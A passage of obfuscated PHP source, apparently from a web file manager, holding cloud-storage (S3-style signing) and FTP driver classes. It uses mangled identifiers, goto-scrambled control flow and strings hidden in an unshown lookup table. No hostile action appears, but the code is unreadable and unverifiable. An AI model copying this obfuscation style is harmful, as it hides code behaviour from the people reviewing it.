$_SERVER[Ä¿¡‡öóµŸﬂ‡]; $A©Æà—ª“¯ = isset($fë±¥Ò≈Õ‰[$Aù–Ø‰∞£≥[160]]) ? $fë±¥Ò≈Õ‰[$Aù–Ø‰∞£≥[160]] : $Aù–Ø‰∞£≥[33]; $dª°ëçò÷Ñ = $fë±¥Ò≈Õ‰[$Aù–Ø‰∞£≥[89]]; goto bàº⁄ñ‰£; cæ‚π∆Ôìø: if (isset($fë±¥Ò≈Õ‰[$Aù–Ø‰∞£≥[1234]])) { $eíÍ˜ôãçã[$Aù–Ø‰∞£≥[1235]] = $fë±¥Ò≈Õ‰[$Aù–Ø‰∞£≥[1234]]; } $cÓò≠ç†ù¿ = explode($Aù–Ø‰∞£≥[171], $this->getHost()); $a±Öﬂ£´¢ê = array($Aù–Ø‰∞£≥[1236] => $cÓò≠ç†ù¿[1], $Aù–Ø‰∞£≥[1237] => $Aù–Ø‰∞£≥[33], $Aù–Ø‰∞£≥[199] => $Aù–Ø‰∞£≥[116], $Aù–Ø‰∞£≥[1149] => $fë±¥Ò≈Õ‰[$Aù–Ø‰∞£≥[77]]); goto Fµ©Ô¥¨ñà; bàº⁄ñ‰£: unset($fë±¥Ò≈Õ‰[$Aù–Ø‰∞£≥[89]]); if (isset($fë±¥Ò≈Õ‰[$Aù–Ø‰∞£≥[211]])) { return $this->listUploadParts($dª°ëçò÷Ñ, $fë±¥Ò≈Õ‰); } $eíÍ˜ôãçã = array(); goto cæ‚π∆Ôìø; Fµ©Ô¥¨ñà: $b˜ÚƒçÿÔ€ = $Aù–Ø‰∞£≥[214]; $dé®È‹Ì˜« = $Aù–Ø‰∞£≥[8] . $this->pathEncode($dª°ëçò÷Ñ) . $A©Æà—ª“¯; $a¬ƒ°ˆ”í’ = $this->client->__getSignatureV4($eíÍ˜ôãçã, $a±Öﬂ£´¢ê, $b˜ÚƒçÿÔ€, $dé®È‹Ì˜«); goto C·ñòó√í”; C·ñòó√í”: if (strpos($A©Æà—ª“¯, $Aù–Ø‰∞£≥[213]) === 0) { if (isset($eíÍ˜ôãçã[$Aù–Ø‰∞£≥[1235]])) { $cÉΩâù•åÁ = $eíÍ˜ôãçã[$Aù–Ø‰∞£≥[1235]]; } else { if (isset($a¬ƒ°ˆ”í’[$Aù–Ø‰∞£≥[1235]])) { $cÉΩâù•åÁ = $a¬ƒ°ˆ”í’[$Aù–Ø‰∞£≥[1235]]; } else { $cÉΩâù•åÁ = hash($Aù–Ø‰∞£≥[1147], $Aù–Ø‰∞£≥[33]); } } return array($Aù–Ø‰∞£≥[220] => $a¬ƒ°ˆ”í’[$Aù–Ø‰∞£≥[220]], $Aù–Ø‰∞£≥[1235] => $cÉΩâù•åÁ, $Aù–Ø‰∞£≥[210] => $a¬ƒ°ˆ”í’[$Aù–Ø‰∞£≥[1238]]); } return $a¬ƒ°ˆ”í’[$Aù–Ø‰∞£≥[220]]; goto b∞…Ù‘Ç¡Ê; b∞…Ù‘Ç¡Ê: } public function listUploadParts($EÙËÓ¢≥ÀÏ, $EºÒπÒΩ≥‡ = array()) { goto B∫û«ãú»Ê; B∫û«ãú»Ê: $dë‹∑Î§öå =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $eå⁄êÒÓŸ  = str_replace($dë‹∑Î§öå[221], $dë‹∑Î§öå[33], $EºÒπÒΩ≥‡[$dë‹∑Î§öå[160]]); $c…îìûë…◊ = $this->client->listParts($this->bucket, $EÙËÓ¢≥ÀÏ, $eå⁄êÒÓŸ ); goto c§æÓÊ®ôÛ; c§æÓÊ®ôÛ: if (!$c…îìûë…◊) { return !1; } $F‚≥°⁄î√› = $dë‹∑Î§öå[1239]; foreach ($c…îìûë…◊ as $BÖﬁ‚Ú≤ò) { $F‚≥°⁄î√› .= $dë‹∑Î§öå[1240] . "\x3c\x50\141\x72\164\116\x75\x6d\142\145\x72\x3e{$BÖﬁ‚Ú≤ò[$dë‹∑Î§öå[1191]]}\74\57\x50\x61\162\164\x4e\x75\155\x62\145\x72\76\12" . "\x3c\105\x54\x61\x67\x3e{$BÖﬁ‚Ú≤ò[$dë‹∑Î§öå[1192]]}\x3c\x2f\105\x54\141\x67\76\12" . $dë‹∑Î§öå[1241]; } goto e∞—œ˘Úé¨; A–±Ûñ€¿Ÿ: $fµéúÛ≤áá = array($dë‹∑Î§öå[1236] => $eøöêÃÜ¶∂[1], $dë‹∑Î§öå[199] => $dë‹∑Î§öå[116], $dë‹∑Î§öå[1149] => strlen($F‚≥°⁄î√›)); $cﬂáü´ßò≤ = $dë‹∑Î§öå[212]; $aÌÓôµ•†Â = $dë‹∑Î§öå[8] . $this->pathEncode($EÙËÓ¢≥ÀÏ) . $EºÒπÒΩ≥‡[$dë‹∑Î§öå[160]]; goto b€§å–Ø•¡; e∞—œ˘Úé¨: $F‚≥°⁄î√› .= $dë‹∑Î§öå[1242]; $câÇõåÉ˜Ç = array(); $eøöêÃÜ¶∂ = explode($dë‹∑Î§öå[171], $this->getHost()); goto A–±Ûñ€¿Ÿ; b€§å–Ø•¡: $a¿ºî∏°©Ω = $this->client->__getSignatureV4($câÇõåÉ˜Ç, $fµéúÛ≤áá, $cﬂáü´ßò≤, $aÌÓôµ•†Â, $F‚≥°⁄î√›); return array($dë‹∑Î§öå[220] => $a¿ºî∏°©Ω[$dë‹∑Î§öå[220]], $dë‹∑Î§öå[210] => $a¿ºî∏°©Ω[$dë‹∑Î§öå[1238]], $dë‹∑Î§öå[222] => $c…îìûë…◊, $dë‹∑Î§öå[1235] => $a¿ºî∏°©Ω[$dë‹∑Î§öå[1235]]); goto fìµˆñ®∆ï; fìµˆñ®∆ï: } public function link($C£±Õ∏ó•é, $cÛ·ÊáûÍó = array()) { return parent::link($C£±Õ∏ó•é, $cÛ·ÊáûÍó); } public function fileOut($b¥«∏Ô®¿£, $a≈⁄⁄ü¿Ñ¯ = false, $Eû»«´õ∑Ü = false, $Cà‡÷ßáÆû = '') { if (strstr($this->endpoint, $_SERVER[Ä¿¡‡öóµŸﬂ‡][1243])) { return parent::fileOutServer($b¥«∏Ô®¿£, $a≈⁄⁄ü¿Ñ¯, $Eû»«´õ∑Ü, $Cà‡÷ßáÆû); } parent::fileOut($b¥«∏Ô®¿£, $a≈⁄⁄ü¿Ñ¯, $Eû»«´õ∑Ü, $Cà‡÷ßáÆû); } public function fileOutImage($Døâú’Ó¶Õ, $e¢í¨‰í‡ê = 250) { if (strstr($this->endpoint, $_SERVER[Ä¿¡‡öóµŸﬂ‡][1243])) { return parent::fileOutImageServer($Døâú’Ó¶Õ, $e¢í¨‰í‡ê); } parent::fileOutImage($Døâú’Ó¶Õ, $e¢í¨‰í‡ê); } public function fileOutLink($Aé∫‹§ŒÁã) { $e…‰µñ®¬å =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (substr($Aé∫‹§ŒÁã, 0, 7) == $e…‰µñ®¬å[1119]) { $Aé∫‹§ŒÁã = $e…‰µñ®¬å[1120] . substr($Aé∫‹§ŒÁã, 7); } header($e…‰µñ®¬å[156] . $Aé∫‹§ŒÁã); die; } public function getHost() { $F Ï·ÑàÀ± =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $bæ‘Í—‹ΩË = str_rtrim(parent::getHost(), $F Ï·ÑàÀ±[8] . $this->bucket); $bæ‘Í—‹ΩË = explode($F Ï·ÑàÀ±[171], $bæ‘Í—‹ΩË); return $bæ‘Í—‹ΩË[0] . $F Ï·ÑàÀ±[171] . $this->bucket . $F Ï·ÑàÀ±[91] . $bæ‘Í—‹ΩË[1]; } } goto cœËàæ∏Ú€; f¥èπÌƒé”: function beforeShutdown() { Hook::trigger($_SERVER[ÁŸäœ¨][36]); } $_SERVER[$_SERVER[ÁŸäœ¨][37]] = BASIC_PATH; $_SERVER[$_SERVER[ÁŸäœ¨][38]] = LIB_DIR; goto BÚØˆó£ÇÈ; E–Ωö…Ñ¬∫: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($f÷Ñ•ƒËı€) { $this->pathParse = $f÷Ñ•ƒËı€; } protected function infoParse($féüëê‰ãÃ, $EÉ‚€–‡ﬁó = false) { $aà“çﬁ‘€∑ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; return Action($aà“çﬁ‘€∑[1022])->sharePathInfo($this->pathParse[$aà“çﬁ‘€∑[75]], !0, $EÉ‚€–‡ﬁó); } public function listPath($C…›å Ÿü—, $F”ê∞Áé≠˜ = false) { $dæ©—äÜ¿ñ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $aÜ∑¡ª¥¥Ú = IO::listPath($C…›å Ÿü—, $F”ê∞Áé≠˜); foreach ($aÜ∑¡ª¥¥Ú as $AÂ•›Ûä∂ƒ => $CÑ∏ˆ°ïù◊) { if (!in_array($AÂ•›Ûä∂ƒ, array($dæ©—äÜ¿ñ[73], $dæ©—äÜ¿ñ[74]))) { continue; } foreach ($CÑ∏ˆ°ïù◊ as $e‹É√±çÖ => $A¶ûÛ∆éƒê) { $A¶ûÛ∆éƒê = Action($dæ©—äÜ¿ñ[1136])->parsePathChildren($A¶ûÛ∆éƒê, array($dæ©—äÜ¿ñ[387] => $C…›å Ÿü—)); $aÜ∑¡ª¥¥Ú[$AÂ•›Ûä∂ƒ][$e‹É√±çÖ] = Action($dæ©—äÜ¿ñ[1022])->shareItemInfo($A¶ûÛ∆éƒê); } } return $aÜ∑¡ª¥¥Ú; } public function listAll($eΩ¢»“Œ˜‹) { $A“„÷ «€é =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Fëâ¬‰≤«Î = IO::listAll($eΩ¢»“Œ˜‹); foreach ($Fëâ¬‰≤«Î as &$e§ç¡¿•—∫) { $e§ç¡¿•—∫ = array_merge(IO::info($e§ç¡¿•—∫[$A“„÷ «€é[75]]), $e§ç¡¿•—∫); $e§ç¡¿•—∫[$A“„÷ «€é[391]] = Action($A“„÷ «€é[1022])->shareItemInfo($e§ç¡¿•—∫); } return $Fëâ¬‰≤«Î; } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($CÌ∑ï”Ç›Ô) { parent::__construct($CÌ∑ï”Ç›Ô); $this->signatureVersion($_SERVER[Ä¿¡‡öóµŸﬂ‡][200]); } public function uploadFormData($Bü®çû®¢›, $Bã¨ÇÜ“ÖÆ = 3600) { goto bí∏∆äªÍ˘; E≤¨‚Óõë∂: $BØ‡¨…èÍ› = base64_encode(json_encode($dÊ›áóç¥∆)); $CÑåè™Ã∏¡ = hash_hmac($A÷îÇ‰Ï„í[1147], $DâπÚ∑’¥Ç, $A÷îÇ‰Ï„í[1148] . $this->secret, !0); $B∂àÒåÒ¶— = hash_hmac($A÷îÇ‰Ï„í[1147], $this->region, $CÑåè™Ã∏¡, !0); goto f≠í≈±€‹ã; CÜ≤≠∞å•Ù: $Aπ°≠èÊõ∏ = array($this->accessKey, $DâπÚ∑’¥Ç, $this->region, $fÕŒ∏Âòﬂ„, $B√Ã≤çÊîë); $b•√ñ€ÆˆÜ = implode($A÷îÇ‰Ï„í[8], $Aπ°≠èÊõ∏); $dÊ›áóç¥∆ = array($A÷îÇ‰Ï„í[1106] => gmdate($A÷îÇ‰Ï„í[1105], strtotime($A÷îÇ‰Ï„í[1140])), $A÷îÇ‰Ï„í[1107] => array(array($A÷îÇ‰Ï„í[1109] => $this->bucket), array($A÷îÇ‰Ï„í[1108] => $CòïΩãßÚÇ), array($A÷îÇ‰Ï„í[1110], $A÷îÇ‰Ï„í[1111], $A÷îÇ‰Ï„í[33]), array($A÷îÇ‰Ï„í[1110], $A÷îÇ‰Ï„í[1141], $A÷îÇ‰Ï„í[33]), array($A÷îÇ‰Ï„í[1110], $A÷îÇ‰Ï„í[1142], $A÷îÇ‰Ï„í[33]), array($A÷îÇ‰Ï„í[1112] => $Fç≤ó†ÂÌá), array($A÷îÇ‰Ï„í[1143] => $b•√ñ€ÆˆÜ), array($A÷îÇ‰Ï„í[1144] => $A•≈“µÂ™Ç), array($A÷îÇ‰Ï„í[1145] => $FàÁÇê«∫Ü), array($A÷îÇ‰Ï„í[1146] => $CåÖˆ∫∑áò))); goto E≤¨‚Óõë∂; bí∏∆äªÍ˘: $A÷îÇ‰Ï„í =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $CòïΩãßÚÇ = $A÷îÇ‰Ï„í[185]; $A•≈“µÂ™Ç = $A÷îÇ‰Ï„í[1137]; goto a¢‚»™ŒõÖ; bçãÇ‹ìÛê: $B√Ã≤çÊîë = $A÷îÇ‰Ï„í[1139]; $CåÖˆ∫∑áò = $Bã¨ÇÜ“ÖÆ . $A÷îÇ‰Ï„í[33]; $Fç≤ó†ÂÌá = $A÷îÇ‰Ï„í[1104]; goto CÜ≤≠∞å•Ù; CòÇê°‰ûΩ: $Dº¨ΩäÉ¬µ = array($A÷îÇ‰Ï„í[199] => $A÷îÇ‰Ï„í[33], $A÷îÇ‰Ï„í[1149] => $A÷îÇ‰Ï„í[33], $A÷îÇ‰Ï„í[1108] => $CòïΩãßÚÇ, $A÷îÇ‰Ï„í[1112] => $Fç≤ó†ÂÌá, $A÷îÇ‰Ï„í[1116] => $BØ‡¨…èÍ›, $A÷îÇ‰Ï„í[1150] => $b•√ñ€ÆˆÜ, $A÷îÇ‰Ï„í[1151] => $A•≈“µÂ™Ç, $A÷îÇ‰Ï„í[1152] => $FàÁÇê«∫Ü, $A÷îÇ‰Ï„í[1153] => $CåÖˆ∫∑áò, $A÷îÇ‰Ï„í[1154] => $dÙ≥◊†äì∑, $A÷îÇ‰Ï„í[169] => $this->getHost()); return $Dº¨ΩäÉ¬µ; goto E‹Óã™Á¨™; f≠í≈±€‹ã: $CÈˆ†è¡∏— = hash_hmac($A÷îÇ‰Ï„í[1147], $fÕŒ∏Âòﬂ„, $B∂àÒåÒ¶—, !0); $Dá»ﬁæª¨‘ = hash_hmac($A÷îÇ‰Ï„í[1147], $B√Ã≤çÊîë, $CÈˆ†è¡∏—, !0); $dÙ≥◊†äì∑ = hash_hmac($A÷îÇ‰Ï„í[1147], $BØ‡¨…èÍ›, $Dá»ﬁæª¨‘); goto CòÇê°‰ûΩ; a¢‚»™ŒõÖ: $fÕŒ∏Âòﬂ„ = $A÷îÇ‰Ï„í[59]; $FàÁÇê«∫Ü = gmdate($A÷îÇ‰Ï„í[1138]); $DâπÚ∑’¥Ç = gmdate($A÷îÇ‰Ï„í[690]); goto bçãÇ‹ìÛê; E‹Óã™Á¨™: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = FALSE; private $config = array(); public function __construct($D§Ÿ≈ó∆¨…) { parent::__construct(); if (count($D§Ÿ≈ó∆¨…) > 0) { $this->_init($D§Ÿ≈ó∆¨…); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($CÀ±¶ÒÑÁÉ) { $aòç„ëÒ÷Ò =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; global $config; $this->appCharset = $config[$aòç„ëÒ÷Ò[1155]]; $this->systemCharset = $config[$aòç„ëÒ÷Ò[1156]]; if (isset($CÀ±¶ÒÑÁÉ[$aòç„ëÒ÷Ò[1157]]) && $CÀ±¶ÒÑÁÉ[$aòç„ëÒ÷Ò[1157]]) { $this->systemCharset = $CÀ±¶ÒÑÁÉ[$aòç„ëÒ÷Ò[1157]]; } } public function iconvApp($dÛ◊ƒΩæú ) { return $this->iconvTo($dÛ◊ƒΩæú , $this->systemCharset, $this->appCharset); } public function iconvSystem($d‡âòäµü) { return $this->iconvTo($d‡âòäµü, $this->appCharset, $this->systemCharset); } public function getPathOuter($CÉîÿåŸ∂è) { goto A·†ÔÓÑ≈å; A·†ÔÓÑ≈å: $aÇÌˆÑõ◊∂ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $B¶ˆ‘ƒÉﬂó = $this->iconvApp($this->pathBase); $CÉîÿåŸ∂è = $this->iconvApp($CÉîÿåŸ∂è); goto F…éæ†Ü∂»; AÒöºÓçÛ‘: return $this->pathDriver . $aÇÌˆÑõ◊∂[8] . ltrim($CÉîÿåŸ∂è, $aÇÌˆÑõ◊∂[8]); goto A´ú€á˘àø; C«£òÇ‰≈Ù: $CÉîÿåŸ∂è = KodIO::clear($CÉîÿåŸ∂è); $CÉîÿåŸ∂è = substr($CÉîÿåŸ∂è, strlen($B¶ˆ‘ƒÉﬂó)); if (empty($this->pathDriver)) { return $CÉîÿåŸ∂è; } goto AÒöºÓçÛ‘; F…éæ†Ü∂»: if (substr($B¶ˆ‘ƒÉﬂó, 0, 2) == $aÇÌˆÑõ◊∂[1158]) { $B¶ˆ‘ƒÉﬂó = BASIC_PATH . substr($B¶ˆ‘ƒÉﬂó, 2); } if (substr($CÉîÿåŸ∂è, 0, 2) == $aÇÌˆÑõ◊∂[1158]) { $CÉîÿåŸ∂è = BASIC_PATH . substr($CÉîÿåŸ∂è, 2); } $B¶ˆ‘ƒÉﬂó = KodIO::clear($B¶ˆ‘ƒÉﬂó); goto C«£òÇ‰≈Ù; A´ú€á˘àø: } private function _init($Eâ…¢úè∫◊ = array()) { $F¨ï…ÆÓœÍ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!function_exists($F¨ï…ÆÓœÍ[1159])) { show_json(LNG($F¨ï…ÆÓœÍ[1160]), !1); } $this->config = $Eâ…¢úè∫◊; $this->charsetReset($Eâ…¢úè∫◊); foreach ($Eâ…¢úè∫◊ as $c◊ßöºó–ñ => $aﬁ›‡Ö÷è‚) { if (isset($this->{$c◊ßöºó–ñ})) { $this->{$c◊ßöºó–ñ} = $aﬁ›‡Ö÷è‚; } } return $this->_login($Eâ…¢úè∫◊); } private function _login($Fù˜∑»û‰ó) { goto Cå‚√™àøô; d™‰ë¬Øäó: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); @ftp_pasv($this->connect, !0); $EË›çË”–Ø[$BÇßÇ±ï»Ü] = array($cæ–è◊ΩÓê[1164] => $this->connect, $cæ–è◊ΩÓê[169] => $this->host, $cæ–è◊ΩÓê[168] => $this->scheme, $cæ–è◊ΩÓê[170] => $this->port); goto DÀ§˘«…›⁄; CËü◊ø≤…Ë: if (isset($EË›çË”–Ø[$BÇßÇ±ï»Ü])) { foreach ($EË›çË”–Ø[$BÇßÇ±ï»Ü] as $Cú¥º·èÂà => $AÖ…‚ë’ó¡) { $this->{$Cú¥º·èÂà} = $AÖ…‚ë’ó¡; } return !0; } $E÷«¢É•¯À = parse_url(trim($this->server, $cæ–è◊ΩÓê[8])); $this->host = $E÷«¢É•¯À[$cæ–è◊ΩÓê[169]]; goto D‚ûù€ûÁÈ; Cå‚√™àøô: $cæ–è◊ΩÓê =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; static $EË›çË”–Ø = array(); $BÇßÇ±ï»Ü = md5(json_encode($Fù˜∑»û‰ó)); goto CËü◊ø≤…Ë; D‚ûù€ûÁÈ: $Aõ∆Ì◊•Ôô = isset($E÷«¢É•¯À[$cæ–è◊ΩÓê[168]]) && $E÷«¢É•¯À[$cæ–è◊ΩÓê[168]] == $cæ–è◊ΩÓê[1161] ? !0 : !1; $this->scheme = $Aõ∆Ì◊•Ôô ? $cæ–è◊ΩÓê[1162] : $cæ–è◊ΩÓê[1163]; $this->port = isset($E÷«¢É•¯À[$cæ–è◊ΩÓê[170]]) ? $E÷«¢É•¯À[$cæ–è◊ΩÓê[170]] : 21; goto EÈ∑µÜ´µæ; DÀ§˘«…›⁄: return $dÉÒ⁄Ë∏«Ï; goto a⁄Ô»àºÈñ; EÈ∑µÜ´µæ: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $dÉÒ⁄Ë∏«Ï = @ftp_login($this->connect, $this->username, $this->userpass); goto d™‰ë¬Øäó; a⁄Ô»àºÈñ: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($F…ƒ√∑√Ôì, $a—üπ›Ç‹Ü = '', $BøŸ–óÉ˜« = REPEAT_RENAME) { if ($this->setContent($F…ƒ√∑√Ôì, $a—üπ›Ç‹Ü)) { return $this->getPathOuter($F…ƒ√∑√Ôì); } return !1; } public function mkdir($E÷˘§úóñÉ, $C´…ëãêûÎ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $E÷˘§úóñÉ = $this->iconvSystem($E÷˘§úóñÉ); if ($this->isFolder($E÷˘§úóñÉ) || @ftp_mkdir($this->connect, $E÷˘§úóñÉ)) { return $this->getPathOuter($E÷˘§úóñÉ); } if (!$this->mkdir($this->pathFather($E÷˘§úóñÉ))) { return !1; } if ($E÷˘§úóñÉ = @ftp_mkdir($this->connect, $E÷˘§úóñÉ)) { return $this->getPathOuter($E÷˘§úóñÉ); } return !1; } public function copyFile($A∂óêõç◊´, $f‚ÂÃÂëÿÇ) { goto e¡üÑÇËéÁ; F”âÊœó÷∆: $this->tempFileRemve($Bñè˜ÚÍ≠‘); return $Dåü∆ÿÜ£Õ; goto B¬ﬂ≥êú‹≠; e¡üÑÇËéÁ: if (!$this->_isconn()) { return !1; } $Aè«¥≈ŸºÙ = $this->pathThis($this->iconvSystem($A∂óêõç◊´)); $Bñè˜ÚÍ≠‘ = $this->tempFile($Aè«¥≈ŸºÙ); goto C¢ãÏ˜ÿÓ±; C¢ãÏ˜ÿÓ±: $DıÇÑüµ»Î = $this->iconvApp($Bñè˜ÚÍ≠‘); $this->download($A∂óêõç◊´, $DıÇÑüµ»Î); $Dåü∆ÿÜ£Õ = $this->upload($f‚ÂÃÂëÿÇ, $DıÇÑüµ»Î); goto F”âÊœó÷∆; B¬ﬂ≥êú‹≠: } public function moveFile($Fœ£äﬁãºˆ, $bÜ¯Ó≈ıâÜ) { if (!$this->_isconn()) { return !1; } $Fœ£äﬁãºˆ = $this->iconvSystem($Fœ£äﬁãºˆ); $bÜ¯Ó≈ıâÜ = $this->iconvSystem($bÜ¯Ó≈ıâÜ); $bñÎ≥Âá”Ω = @ftp_rename($this->connect, $Fœ£äﬁãºˆ, $bÜ¯Ó≈ıâÜ); return $bñÎ≥Âá”Ω ? $this->getPathOuter($bÜ¯Ó≈ıâÜ) : !1; } public function delFile($c¯¿ıœ›µÿ) { if (!$this->_isconn()) { return !1; } $c¯¿ıœ›µÿ = $this->iconvSystem($c¯¿ıœ›µÿ); return @ftp_delete($this->connect, $c¯¿ıœ›µÿ); } public function delFolder($c¡“”êá◊…) { if (!$this->_isconn()) { return !1; } $c¡“”êá◊… = $this->iconvSystem($c¡“”êá◊…); $FÒ’˘÷Îºô = $this->ftpList($c¡“”êá◊…); if (!$FÒ’˘÷Îºô) { return @ftp_rmdir($this->connect, $c¡“”êá◊…); } foreach ($FÒ’˘÷Îºô as $Aä£—ñÿ†Û) { if ($this->isFolder($Aä£—ñÿ†Û)) { $Aä£—ñÿ†Û = $this->iconvApp($Aä£—ñÿ†Û); $this->delFolder($Aä£—ñÿ†Û); } else { @ftp_delete($this->connect, $Aä£—ñÿ†Û); } } return @ftp_rmdir($this->connect, $c¡“”êá◊…); } public function rename($Cò÷ÀË“éÌ, $bÔÆÙ⁄∆˜í) { goto BÿØ€âêÓ; Eª»≈Íâê•: $Büç¥«óËâ = $this->iconvSystem($Büç¥«óËâ); $Cò÷ÀË“éÌ = $this->iconvSystem($Cò÷ÀË“éÌ); $EË˜√óóåë = $this->pathFather($Cò÷ÀË“éÌ); goto D†ŒÓ›πûï; BÿØ€âêÓ: $EëâŒÂÖÇ… =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$this->_isconn()) { return !1; } $Büç¥«óËâ = $this->fileNameAuto($this->pathFather($Cò÷ÀË“éÌ), $bÔÆÙ⁄∆˜í); goto Eª»≈Íâê•; D†ŒÓ›πûï: $CÉƒüöÁÒ÷ = rtrim($EË˜√óóåë, $EëâŒÂÖÇ…[8]) . $EëâŒÂÖÇ…[8] . $Büç¥«óËâ; $A‹åê‡”©Ã = @ftp_rename($this->connect, $Cò÷ÀË“éÌ, $CÉƒüöÁÒ÷); $CÉƒüöÁÒ÷ = $this->iconvApp($CÉƒüöÁÒ÷); goto f¢∑Ìîæ„ÿ; f¢∑Ìîæ„ÿ: return $A‹åê‡”©Ã ? $this->getPathOuter($CÉƒüöÁÒ÷) : !1; goto eﬁïêˆãëÔ; eﬁïêˆãëÔ: } private function folderInfo($cåå¿÷√Ó™, $B“ıŒàÙµï = false) { goto C´¡£¶ê®´; C´¡£¶ê®´: $fì·ø«ÔêÑ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Fƒá‚è£ê = $this->getPathOuter(rtrim($cåå¿÷√Ó™, $fì·ø«ÔêÑ[8])); $Dƒ‰Ú⁄¢≤µ = $this->pathThis($Fƒá‚è£ê); goto b⁄≠ã‘Œî˘; b⁄≠ã‘Œî˘: $e∑≥øïˆÈ‚ = $this->iconvSystem($cåå¿÷√Ó™); if ($B“ıŒàÙµï) { return array($fì·ø«ÔêÑ[28] => $Dƒ‰Ú⁄¢≤µ, $fì·ø«ÔêÑ[75] => $Fƒá‚è£ê, $fì·ø«ÔêÑ[29] => $fì·ø«ÔêÑ[76]); } $e∫À›´ÔÂã = array($fì·ø«ÔêÑ[28] => $Dƒ‰Ú⁄¢≤µ, $fì·ø«ÔêÑ[75] => $Fƒá‚è£ê, $fì·ø«ÔêÑ[29] => $fì·ø«ÔêÑ[76], $fì·ø«ÔêÑ[187] => 0, $fì·ø«ÔêÑ[107] => 0, $fì·ø«ÔêÑ[1165] => !0, $fì·ø«ÔêÑ[1166] => !0); goto b∆ÿä”ã˜–; b∆ÿä”ã˜–: return $e∫À›´ÔÂã; goto fä£å≈¬≤∂; fä£å≈¬≤∂: } private function fileInfo($DíÙ¯é›—Ü, $fäºÀà¨∞◊ = false) { goto A∫≤Á√áÖÊ; DœﬂÃúÃºÍ: $Dóå⁄«ïÊó = $this->iconvSystem($DíÙ¯é›—Ü); if ($fäºÀà¨∞◊) { return array($c∆–Üû√≠Ô[28] => $Eä≤ÈèûÇÊ, $c∆–Üû√≠Ô[75] => $C∑îπ„äﬂâ, $c∆–Üû√≠Ô[29] => $c∆–Üû√≠Ô[167], $c∆–Üû√≠Ô[160] => $this->ext($DíÙ¯é›—Ü), $c∆–Üû√≠Ô[77] => $this->size($DíÙ¯é›—Ü)); } $bÓÖòå•æã = array($c∆–Üû√≠Ô[28] => $Eä≤ÈèûÇÊ, $c∆–Üû√≠Ô[75] => $C∑îπ„äﬂâ, $c∆–Üû√≠Ô[29] => $c∆–Üû√≠Ô[167], $c∆–Üû√≠Ô[187] => 0, $c∆–Üû√≠Ô[107] => @ftp_mdtm($this->connect, $Dóå⁄«ïÊó), $c∆–Üû√≠Ô[160] => $this->ext($DíÙ¯é›—Ü), $c∆–Üû√≠Ô[77] => $this->size($DíÙ¯é›—Ü), $c∆–Üû√≠Ô[1165] => !0, $c∆–Üû√≠Ô[1166] => !0); goto FÔ»éÜœı…; FÔ»éÜœı…: $bÓÖòå•æã[$c∆–Üû√≠Ô[107]] = $bÓÖòå•æã[$c∆–Üû√≠Ô[107]] > 0 ? $bÓÖòå•æã[$c∆–Üû√≠Ô[107]] : 0; return $bÓÖòå•æã; goto e∂Üƒí”À¨; A∫≤Á√áÖÊ: $c∆–Üû√≠Ô =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $C∑îπ„äﬂâ = $this->getPathOuter(rtrim($DíÙ¯é›—Ü, $c∆–Üû√≠Ô[8])); $Eä≤ÈèûÇÊ = $this->pathThis($C∑îπ„äﬂâ); goto DœﬂÃúÃºÍ; e∂Üƒí”À¨: } public function size($eñ˜á‹”–£) { $CÉ•øÁº‹≠ = $this->objectMeta($eñ˜á‹”–£); return $CÉ•øÁº‹≠ ? $CÉ•øÁº‹≠[$_SERVER[Ä¿¡‡öóµŸﬂ‡][77]] : 0; } public function info($cæıÜå∂÷Ø) { if ($this->isFile($cæıÜå∂÷Ø)) { return $this->fileInfo($cæıÜå∂÷Ø, 0); } else { if ($this->isFolder($cæıÜå∂÷Ø)) { return $this->folderInfo($cæıÜå∂÷Ø); } } return !1; } public function exist($e€‹â«Œœç) { return $this->objectMeta($e€‹â«Œœç) ? !0 : !1; } public function isFile($B™Á©Ê—äà) { $f»î„·Ñà‚ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $a‡÷ ∂®∫† = $this->objectMeta($B™Á©Ê—äà); return $a‡÷ ∂®∫† ? $a‡÷ ∂®∫†[$f»î„·Ñà‚[29]] == $f»î„·Ñà‚[167] : !1; } public function isFolder($a∏¶É°ò‡‘) { $DŸıéƒÍØÁ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $F∑Ã®æË‚® = $this->objectMeta($a∏¶É°ò‡‘); return $F∑Ã®æË‚® ? $F∑Ã®æË‚®[$DŸıéƒÍØÁ[29]] == $DŸıéƒÍØÁ[76] : !1; } public function listPath($DÉ˜∑ôı‰œ, $CÓ««π°ç” = false) { goto Aãç∏“’ÕÉ; Aãç∏“’ÕÉ: $bÉÉÏµÏä‹ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$this->_isconn()) { return !1; } $DÉ˜∑ôı‰œ = $this->iconvSystem($DÉ˜∑ôı‰œ); goto A˘—åïéê≤; fÜã≠ˆ«Ç⁄: foreach ($Cµä÷ï÷©¥ as $DÉ˜∑ôı‰œ) { if ($this->isFolder($DÉ˜∑ôı‰œ)) { $C‘ô‡â¢Ïõ[$bÉÉÏµÏä‹[74]][] = $this->folderInfo($DÉ˜∑ôı‰œ, $CÓ««π°ç”); } else { $C‘ô‡â¢Ïõ[$bÉÉÏµÏä‹[73]][] = 